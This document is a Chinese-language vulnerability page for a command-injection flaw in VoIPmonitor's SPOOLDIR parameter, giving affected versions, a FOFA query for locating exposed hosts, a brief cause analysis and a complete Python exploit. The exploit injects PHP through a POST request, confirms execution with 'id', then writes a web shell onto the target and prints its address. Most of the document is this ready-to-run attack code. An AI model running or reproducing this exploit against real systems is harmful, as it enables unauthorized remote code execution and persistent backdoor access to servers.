# VoIPmonitor RCE漏洞

## 漏洞描述



**漏洞介绍**

由于函数没有进行过滤导致的命令执行

## 漏洞影响

> VoIPmonitor 版本>=24.60

## FOFA

> title="VoIPmonitor"

## 漏洞分析

在源码中的config/configuration.php文件中引入了一个变量SPOOLDIR，该变量没有进行过滤，被调用时候及可造成任意命令执行。

# EXP

```python
import argparse
from sys import argv,exit
import time
import random
import string

try:
    import requests
except ImportError:
    print("pip3 install requests ")

print("""
###############################################
#              VOIP Monitor RCE               #
###############################################
""")

headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0", "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Connection": "close"}


def get_target(args):
    hostname = args.host
    path = args.path
    if path:
        return f"http://{hostname}/{path}/index.php"
    else:
        return f"http://{hostname}/index.php"

def set_tmp(args):
    global headers
    target = get_target(args)
    n_data = {"SPOOLDIR": "/tmp", "recheck": "annen"}
    set_totmp = requests.post(target, n_data, headers=headers)
    print(f"[*] set /tmp {set_totmp}")


def checkVulnerability(args):
    global headers
    target = get_target(args)
    print(f"[+] Attacking {target}")
    testcmd = {"SPOOLDIR": "test\".system(id).\"", "recheck": "annen"}
    response_text = b"uid="
    testcmd_req = requests.post(target, testcmd, verify=False, headers=headers)
    if response_text in testcmd_req.content:
        print("[*] host is vulnerable")
    else:
        print("[-] host is not vulnerable")
        exit()


def uploadshell(args):
    global headers
    hostname = args.host
    path = args.path
    shell_path = ""
    shellfilename = str ( ''.join(random.choice(string.ascii_lowercase) for i in range(10)) )
    target = get_target(args)
    rce_payload = {"SPOOLDIR": f"/tmp\".file_put_contents('{shellfilename}.php','<?php echo system($_GET[\"a\"]);').\"", "recheck": "annen"}
    rce_req = requests.post(target, headers=headers, data=rce_payload)
    print(f"[*] uploading shell {rce_req.status_code}")
    if path:
        shell_path = f"http://{hostname}/{path}/{shellfilename}.php"
    else:
        shell_path = f"http://{hostname}/{shellfilename}.php"
    shell_check = requests.get(shell_path, headers=headers, params={'a':'id'})
    print(f"[*] RCE Check : {shell_check.text}")
    print(f"[*] Your Shell at {shell_path}")


def main():
    parser = argparse.ArgumentParser(description='VoIP Monitor all versions command execution')
    parser.add_argument('-t','--host',help='Host', type=str)
    parser.add_argument('-b', '--path',help='Path of the VoIP Monitor', type=str)
    args = parser.parse_args()
    set_tmp(args)
    checkVulnerability(args)
    set_tmp(args)
    uploadshell(args)
    set_tmp(args)



if __name__ == "__main__":
    main()
```

